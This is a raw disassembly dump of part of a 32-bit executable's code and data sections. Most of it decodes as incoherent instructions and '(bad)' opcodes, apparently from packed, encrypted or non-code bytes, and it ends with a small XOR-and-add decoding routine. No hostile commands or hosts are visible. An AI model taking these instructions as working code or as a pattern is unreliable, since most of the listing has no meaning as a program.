  411b3b:	cmp    ebp,DWORD PTR [ecx]
  411b3d:	popf   
  411b3e:	lahf   
  411b3f:	cld    
  411b40:	sub    DWORD PTR [ebp+0x47],ebp
  411b43:	jle    0x411b1e
  411b45:	test   al,0x97
  411b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b48:	shl    BYTE PTR [ecx],cl
  411b4a:	and    DWORD PTR [edi+0x11fd4c57],esi
  411b50:	in     eax,0x49
  411b52:	jecxz  0x411b99
  411b54:	rcr    DWORD PTR [edx],0x71
  411b57:	lds    esi,FWORD PTR [ecx-0xf6a08de]
  411b5d:	xchg   edx,eax
  411b5e:	in     al,dx
  411b5f:	inc    ebx
  411b60:	mov    edi,0xae712972
  411b65:	cmp    eax,0x70900477
  411b6a:	nop
  411b6b:	sub    al,0xa3
  411b6d:	add    al,BYTE PTR [ecx-0x1c90daad]
  411b73:	call   0x20094a9a
  411b78:	mov    al,0x2e
  411b7a:	dec    eax
  411b7b:	sbb    eax,0x5b095f31
  411b80:	push   ebx
  411b81:	add    esp,DWORD PTR ds:0xfaf4b246
  411b87:	mov    dh,0x8e
  411b89:	xchg   edi,eax
  411b8a:	jb     0x411b97
  411b8c:	test   DWORD PTR [edi-0x39],edi
  411b8f:	inc    ebp
  411b90:	out    dx,eax
  411b91:	cmp    ebp,edx
  411b93:	jo     0x411bee
  411b95:	cmp    esp,DWORD PTR [edi+0x37]
  411b98:	inc    edi
  411b99:	and    bh,BYTE PTR [ecx+0x1d]
  411b9c:	jl     0x411bfb
  411b9e:	jo     0x411b86
  411ba0:	icebp  
  411ba1:	adc    al,0x9b
  411ba3:	sti    
  411ba4:	push   0xffffff9c
  411ba6:	scas   eax,DWORD PTR es:[edi]
  411ba7:	and    BYTE PTR [ebp-0x6a],cl
  411baa:	repz inc esp
  411bac:	inc    eax
  411bad:	sbb    al,bh
  411baf:	jecxz  0x411bf6
  411bb1:	or     BYTE PTR [esi],cl
  411bb3:	inc    edx
  411bb4:	pop    esi
  411bb5:	inc    ecx
  411bb6:	adc    ah,BYTE PTR [ebx+0x5d]
  411bb9:	mov    eax,0xf9b7f11
  411bbe:	inc    ebx
  411bbf:	jnp    0x411b7d
  411bc1:	cwde   
  411bc2:	inc    ebx
  411bc3:	mov    ecx,0x2cb9bf4b
  411bc8:	dec    edi
  411bc9:	or     BYTE PTR [eax+esi*1+0x23],cl
  411bcd:	sar    bl,1
  411bcf:	sub    eax,0xf98071a5
  411bd4:	fs push cx
  411bd7:	push   0x1c
  411bd9:	push   ss
  411bda:	cmp    edi,0x47
  411bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bde:	push   cs
  411bdf:	cld    
  411be0:	push   ecx
  411be1:	ins    DWORD PTR es:[edi],dx
  411be2:	cmc    
  411be3:	test   al,0x4d
  411be5:	mov    bl,0xba
  411be7:	mov    ebp,0x280fa0a7
  411bec:	or     BYTE PTR [edx+eax*8],cl
  411bef:	mov    al,ds:0x9a32108
  411bf4:	pop    ebp
  411bf5:	sar    DWORD PTR [ebp-0x57fe2fde],cl
  411bfb:	(bad)
  411bff:	test   BYTE PTR [ebp+0x4e],bh
  411c02:	push   esp
  411c03:	cs jl  0x411bd6
  411c06:	inc    esp
  411c07:	aas    
  411c08:	cdq    
  411c09:	aam    0x1
  411c0b:	add    bl,BYTE PTR [esp+ebp*2-0x5e]
  411c0f:	pop    esi
  411c10:	loope  0x411c69
  411c12:	jg     0x411c73
  411c14:	nop
  411c15:	aam    0x48
  411c17:	jns    0x411c57
  411c19:	push   cs
  411c1a:	dec    ebp
  411c1b:	inc    esp
  411c1c:	imul   esp,ebp,0xf73065e
  411c22:	(bad)  [ebx+0x751f65ac]
  411c28:	xchg   ebx,eax
  411c29:	mov    esi,cs
  411c2b:	adc    dh,ah
  411c2d:	jns    0x411c03
  411c2f:	mov    eax,0x88ff5488
  411c34:	es int3 
  411c36:	and    dh,BYTE PTR [eax+esi*1+0x33e843be]
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x73dad6c4
  411c5b:	cmp    BYTE PTR ds:0x7e4bc7b1,ah
  411c61:	jle    0x411c73
  411c63:	jl     0x411ce3
  411c65:	jle    0x411c04
  411c67:	jg     0x411c86
  411c69:	push   ss
  411c6a:	xor    BYTE PTR [ebp-0x3d],bh
  411c6d:	push   0x7ccef47b
  411c72:	xor    eax,0xa800a923
  411c77:	sub    ecx,esi
  411c79:	mov    dh,0xf3
  411c7b:	hlt    
  411c7c:	dec    edx
  411c7d:	into   
  411c7e:	mov    dl,0x85
  411c80:	xchg   esp,eax
  411c81:	(bad)  
  411c82:	(bad)  
  411c83:	dec    ebx
  411c84:	mov    al,ds:0x6f5d2586
  411c89:	mov    edx,DWORD PTR ds:0xaa4da5ed
  411c8f:	add    esp,esi
  411c91:	ins    DWORD PTR es:[edi],dx
  411c92:	add    eax,0xf691788d
  411c97:	mul    DWORD PTR [ebx+0x71]
  411c9a:	mov    ecx,ds
  411c9c:	inc    ecx
  411c9d:	jae    0x411ce8
  411c9f:	cmp    bl,BYTE PTR [edi+0x13116f15]
  411ca5:	nop
  411ca6:	not    BYTE PTR [ecx+0xe7252b]
  411cac:	popa   
  411cad:	mov    ds:0xe7d8a5a6,al
  411cb2:	or     dl,BYTE PTR [esi-0xf7b0043]
  411cb8:	push   esp
  411cb9:	int    0x50
  411cbb:	js     0x411cb9
  411cbd:	add    DWORD PTR [esp+ebx*2-0x23],esi
  411cc1:	out    0x9e,eax
  411cc3:	inc    eax
  411cc4:	mov    ebx,0x1483044b
  411cc9:	fs inc esp
  411ccb:	sti    
  411ccc:	mov    DWORD PTR [esi+0xc],edx
  411ccf:	pop    esp
  411cd0:	cmp    BYTE PTR [edx+0x2a],cl
  411cd3:	mov    ds:0x90c86505,al
  411cd8:	das    
  411cd9:	add    DWORD PTR [ebx+0x51e30bd7],0x13
  411ce0:	stos   DWORD PTR es:[edi],eax
  411ce1:	out    dx,eax
  411ce2:	fdiv   DWORD PTR ds:0xeeb9c01f
  411ce8:	inc    edx
  411ce9:	fcomp  DWORD PTR [ebp+0x35]
  411cec:	int    0x92
  411cee:	and    ebp,ebx
  411cf0:	mov    DWORD PTR [ebx],edx
  411cf2:	call   0x3d9b258a
  411cf7:	test   al,0xfc
  411cf9:	pusha  
  411cfa:	and    BYTE PTR [edx],cl
  411cfc:	jae    0x411d37
  411cfe:	fcomp  QWORD PTR [edx-0x6c156880]
  411d04:	adc    DWORD PTR [ecx+eax*8],edx
  411d07:	iret   
  411d08:	pop    es
  411d09:	pushf  
  411d0a:	add    ch,cl
  411d0c:	bound  ebp,QWORD PTR [edx-0x4a2c2d38]
  411d12:	push   edx
  411d13:	mov    BYTE PTR [ebx-0x41accbdb],ah
  411d19:	bound  esi,QWORD PTR ds:0x98ab0ee1
  411d1f:	mov    bl,0x1d
  411d21:	sbb    ch,BYTE PTR [esi-0x25]
  411d24:	or     bh,BYTE PTR [esi-0x7b]
  411d27:	mov    ecx,0x551c3e4f
  411d2c:	rcr    BYTE PTR [ecx],cl
  411d2e:	popf   
  411d2f:	xor    esp,0x29
  411d32:	dec    eax
  411d33:	call   0x1ac2:0xeca61622
  411d3a:	xor    dh,BYTE PTR [ecx]
  411d3c:	jmp    0xda96a2be
  411d41:	cmp    dl,bl
  411d43:	call   0x1aaf:0xbb9d7f7f
  411d4a:	pop    esi
  411d4b:	(bad)  
  411d4c:	leave  
  411d4d:	outs   dx,BYTE PTR ds:[esi]
  411d4e:	fcom   DWORD PTR [edi]
  411d50:	jns    0x411d29
  411d52:	push   ebp
  411d53:	scas   eax,DWORD PTR es:[edi]
  411d54:	ret    
  411d55:	imul   ecx,DWORD PTR [edx-0x20],0x7d8c47f8
  411d5c:	test   al,0x49
  411d5e:	sub    edx,esi
  411d60:	mov    ebx,0xeb2042b7
  411d65:	(bad)  
  411d66:	sbb    ebx,DWORD PTR [eax+0x78]
  411d69:	push   ds
  411d6a:	pop    es
  411d6b:	inc    eax
  411d6c:	(bad)  
  411d6d:	fld    st(5)
  411d6f:	jp     0x411dbb
  411d71:	push   eax
  411d72:	stos   DWORD PTR es:[edi],eax
  411d73:	nop
  411d74:	or     ch,bh
  411d76:	ror    BYTE PTR [edi+ebp*8+0x16],cl
  411d7a:	js     0x411d91
  411d7c:	mov    edx,0xb55075fd
  411d81:	ins    DWORD PTR es:[edi],dx
  411d82:	inc    BYTE PTR [edx-0x40449bb4]
  411d88:	fst    DWORD PTR [esi-0x47]
  411d8b:	(bad)  
  411d8c:	mov    eax,ds:0xfe2fe6a2
  411d91:	stc    
  411d92:	xchg   ebx,eax
  411d93:	ins    DWORD PTR es:[edi],dx
  411d94:	shl    DWORD PTR [ebx+0x68a8da4f],1
  411d9a:	sub    ebp,0x5
  411d9d:	pop    ds
  411d9e:	jmp    0x564053ab
  411da3:	mov    ecx,0xff9500f8
  411da8:	sub    bh,BYTE PTR [esi-0x21d26cfe]
  411dae:	jp     0x411d55
  411db0:	(bad)  
  411db1:	bswap  esp
  411db3:	clc    
  411db4:	fistp  QWORD PTR [esi]
  411db6:	sbb    BYTE PTR [edx+0x2e],ch
  411db9:	pop    ebx
  411dba:	into   
  411dbb:	gs js  0x411d7b
  411dbe:	add    BYTE PTR [eax-0x69],0xf2
  411dc2:	push   edx
  411dc3:	add    al,0xb9
  411dc5:	test   eax,0xbf14a87
  411dca:	inc    ecx
  411dcb:	adc    cl,BYTE PTR [edx-0x11]
  411dce:	(bad)  
  411dcf:	add    dl,dl
  411dd1:	push   es
  411dd2:	xchg   edi,eax
  411dd3:	ss sub eax,0x6cb6ad6a
  411dd9:	xchg   edi,eax
  411dda:	(bad)  
  411ddb:	ja     0x411d67
  411ddd:	push   ss
  411dde:	mov    BYTE PTR [esi+0x42],0xfb
  411de2:	sbb    eax,edi
  411de4:	(bad)  
  411de5:	loopne 0x411de3
  411de7:	fld    TBYTE PTR [ebx]
  411de9:	mov    dl,0x8c
  411deb:	mov    al,ds:0x70a09810
  411df0:	adc    DWORD PTR [ebx-0x31],esi
  411df3:	mov    al,ds:0x8db27105
  411df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411df9:	push   eax
  411dfa:	jnp    0x411e07
  411dfc:	add    BYTE PTR [edi-0x40],bl
  411dff:	jns    0x411e6d
  411e01:	ret    
  411e02:	je     0x411e7c
  411e04:	xchg   edi,eax
  411e05:	sub    bl,BYTE PTR es:[ebp-0x78]
  411e09:	loope  0x411e0f
  411e0b:	daa    
  411e0c:	fwait
  411e0d:	popa   
  411e0e:	or     edi,DWORD PTR [eax-0x12735edc]
  411e14:	dec    ebx
  411e15:	add    ecx,DWORD PTR [ecx-0x6bd8c4a]
  411e1b:	hlt    
  411e1c:	pop    esi
  411e1d:	jne    0x411e26
  411e1f:	xchg   edi,eax
  411e20:	arpl   WORD PTR [ebx-0x45],ax
  411e23:	xchg   esp,eax
  411e24:	repnz pusha 
  411e26:	push   ecx
  411e27:	retf   
  411e28:	mov    DWORD PTR ds:0xc9226856,esi
  411e2e:	push   ebx
  411e2f:	sub    dh,0x69
  411e32:	sbb    DWORD PTR [ebx+0x5f3306d5],edi
  411e38:	addr16 mov esp,0xb699ba90
  411e3e:	sub    ecx,ecx
  411e40:	xor    ch,0x23
  411e43:	test   DWORD PTR [edi],edx
  411e45:	call   0x4f51:0xf1de2f22
  411e4c:	mov    ch,al
  411e4e:	test   DWORD PTR [eax+0x49595497],esi
  411e54:	lods   eax,DWORD PTR ds:[esi]
  411e55:	xchg   ecx,eax
  411e56:	mov    cl,cl
  411e58:	ins    DWORD PTR es:[edi],dx
  411e59:	(bad)  
  411e5b:	mov    ecx,0xb5258665
  411e60:	hlt    
  411e61:	test   eax,0x5d60a652
  411e66:	sub    al,0xa4
  411e68:	std    
  411e69:	je     0x411df2
  411e6b:	inc    edi
  411e6c:	mov    eax,ds:0x4705b3be
  411e71:	repnz pop eax
  411e73:	(bad)  [edi-0x350df19d]
  411e79:	leave  
  411e7a:	xchg   ebp,eax
  411e7b:	add    bl,BYTE PTR [esp+edx*8+0x4b]
  411e7f:	pop    di
  411e81:	xchg   esi,eax
  411e82:	retf   0x3929
  411e85:	inc    esi
  411e86:	push   esp
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
